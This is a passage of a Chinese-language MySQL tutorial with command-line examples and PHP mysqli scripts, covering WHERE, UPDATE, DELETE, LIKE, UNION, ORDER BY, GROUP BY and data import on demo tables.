返回false。</td></tr><tr><td align="left">&lt;</td><td align="left">小于号，检测左边的值是否小于右边的值, 如果左边的值小于右边的值返回true</td><td align="left">(A &lt; B) 返回 true。</td></tr><tr><td align="left">&gt;=</td><td align="left">大于等于号，检测左边的值是否大于或等于右边的值, 如果左边的值大于或等于右边的值返回true</td><td align="left">(A &gt;= B) 返回false。</td></tr><tr><td align="left">&lt;=</td><td align="left">小于等于号，检测左边的值是否小于或等于右边的值, 如果左边的值小于或等于右边的值返回true</td><td align="left">(A &lt;= B) 返回 true。</td></tr></tbody></table><p>如果我们想在 MySQL 数据表中读取指定的数据，WHERE 子句是非常有用的。</p><p>使用主键来作为 WHERE 子句的条件查询是非常快速的。</p><p>如果给定的条件在表中没有任何匹配的记录，那么查询不会返回任何数据</p><p>以下实例将读取 runoob_tbl 表中 runoob_author 字段值为 Sanjay 的所有记录：</p><h5 id="SQL-SELECT-WHERE-子句"><a href="#SQL-SELECT-WHERE-子句" class="headerlink" title="SQL SELECT WHERE 子句"></a>SQL SELECT WHERE 子句</h5><p><code>SELECT * from runoob_tbl WHERE runoob_author=&#39;菜鸟教程&#39;;</code></p><p>可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;runoob.com&#x27;;</span><br><span class="line">Empty set (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;RUNOOB.COM&#x27;;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | JAVA 教程   | RUNOOB.COM    | 2016-05-06      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">// 读取 runoob_author 为 RUNOOB.COM 的数据</span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author=&quot;RUNOOB.COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL WHERE 子句测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="update更新"><a href="#update更新" class="headerlink" title="update更新"></a>update更新</h4><p>我们需要修改或更新 MySQL 中的数据，我们可以使用 SQL UPDATE 命令来操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; UPDATE runoob_tbl SET runoob_title=&#x27;学习 C++&#x27; WHERE runoob_id=3;</span><br><span class="line">Query OK, 1 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl WHERE runoob_id=3;</span><br><span class="line">+-----------+--------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title | runoob_author | submission_date |</span><br><span class="line">+-----------+--------------+---------------+-----------------+</span><br><span class="line">| 3         | 学习 C++   | RUNOOB.COM    | 2016-05-06      |</span><br><span class="line">+-----------+--------------+---------------+-----------------+</span><br><span class="line">1 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;UPDATE runoob_tbl</span><br><span class="line">        SET runoob_title=&quot;学习 Python&quot;</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法更新数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据更新成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="delete子句"><a href="#delete子句" class="headerlink" title="delete子句"></a>delete子句</h4><p>SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; DELETE FROM runoob_tbl WHERE runoob_id=3;</span><br><span class="line">Query OK, 1 row affected (0.23 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;DELETE FROM runoob_tbl</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法删除数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据删除成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="like子句"><a href="#like子句" class="headerlink" title="like子句"></a>like子句</h4><p>使用 WHERE…LIKE 子句来从MySQL数据表 runoob_tbl 中读取数据。</p><p>这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。</p><p>SQL LIKE 子句中使用百分号 **%**字符来表示任意字符，类似于UNIX或正则表达式中的星号 *****。</p><p>如果没有使用百分号 <strong>%</strong>, LIKE 子句与等号 <strong>=</strong> 的效果是一样的。</p><p>以下是我们将 runoob_tbl 表中获取 runoob_author 字段中以 COM为结尾的的所有记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT * from runoob_tbl  WHERE runoob_author LIKE &#x27;%COM&#x27;;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author LIKE &quot;%COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT country FROM Websites</span><br><span class="line">UNION</span><br><span class="line">SELECT country FROM apps</span><br><span class="line">ORDER BY country;</span><br></pre></td></tr></table></figure><p><img src="image-20211227142757263.png" alt="image-20211227142757263"></p><h5 id="union-all"><a href="#union-all" class="headerlink" title="union all"></a>union all</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT country FROM Websites</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT country FROM apps</span><br><span class="line">ORDER BY country;</span><br></pre></td></tr></table></figure><p><img src="image-20211227143024149.png" alt="image-20211227143024149"></p><h4 id="where-的unionall"><a href="#where-的unionall" class="headerlink" title="where 的unionall"></a>where 的unionall</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT country, name FROM Websites</span><br><span class="line">WHERE country=&#x27;CN&#x27;</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT country, app_name FROM apps</span><br><span class="line">WHERE country=&#x27;CN&#x27;</span><br><span class="line">ORDER BY country;</span><br></pre></td></tr></table></figure><p><img src="image-20211227143051407.png" alt="image-20211227143051407"></p><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>order by </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT * from runoob_tbl ORDER BY submission_date ASC;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; SELECT * from runoob_tbl ORDER BY submission_date DESC;</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| runoob_id | runoob_title  | runoob_author | submission_date |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">| 1         | 学习 PHP    | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 2         | 学习 MySQL  | 菜鸟教程  | 2017-04-12      |</span><br><span class="line">| 4         | 学习 Python | RUNOOB.COM    | 2016-03-06      |</span><br><span class="line">| 3         | 学习 Java   | RUNOOB.COM    | 2015-05-01      |</span><br><span class="line">+-----------+---------------+---------------+-----------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        ORDER BY  submission_date ASC&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL ORDER BY 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h4><p>group by</p><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p><p>在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set names utf8;</span><br><span class="line">mysql&gt; SELECT * FROM employee_tbl;</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | signin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | 小明 | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | 小王 | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | 小丽 | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | 小王 | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | 小明 | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | 小明 | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM   employee_tbl GROUP BY name;</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>with rollup</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT name, SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | signin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>coalesce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT coalesce(name, &#x27;总数&#x27;), SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| coalesce(name, &#x27;总数&#x27;) | signin_count |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| 小丽                   |            2 |</span><br><span class="line">| 小明                   |            7 |</span><br><span class="line">| 小王                   |            7 |</span><br><span class="line">| 总数                   |           16 |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure><h1 id="MySQL-导入数据"><a href="#MySQL-导入数据" class="headerlink" title="MySQL 导入数据"></a>MySQL 导入数据</h1><p>本章节我们为大家介绍几种简单的 MySQL 导入数据命令。</p><hr><h2 id="1、mysql-命令导入"><a href="#1、mysql-命令导入" class="headerlink" title="1、mysql 命令导入"></a>1、mysql 命令导入</h2><p>使用 mysql 命令导入语法格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名    -p密码    &lt;  要导入的数据库数据(runoob.sql)</span><br></pre></td></tr></table></figure><p><strong>实例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mysql -uroot -p123456 &lt; runoob.sql</span><br></pre></td></tr></table></figure><p>以上命令将将备份的整个数据库 runoob.sql 导入。</p><hr><h2 id="2、source-命令导入"><a href="#2、source-命令导入" class="headerlink" title="2、source 命令导入"></a>2、source 命令导入</h2><p>source 命令导入数据库需要先登录到数库终端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database abc;      # 创建数据库</span><br><span class="line">mysql&gt; use abc;                  # 使用已创建的数据库 </span><br><span class="line">mysql&gt; set names utf8;           # 设置编码</span><br><span class="line">mysql&gt; source /home/abc/abc.sql  # 导入备份数据库</span><br></pre></td></tr></table></figure><hr><h2 id="3、使用-LOAD-DATA-导入数据"><a href="#3、使用-LOAD-DATA-导入数据" class="headerlink" title="3、使用 LOAD DATA 导入数据"></a>3、使用 LOAD DATA 导入数据</h2><p>MySQL 中提供了LOAD DATA INFILE语句来插入数据。 以下实例中将从当前目录中读取文件 dump.txt ，将该文件中的数据插入到当前数据库的 mytbl 表中。</p><figure class="highlight plaintext"><table><tr><td 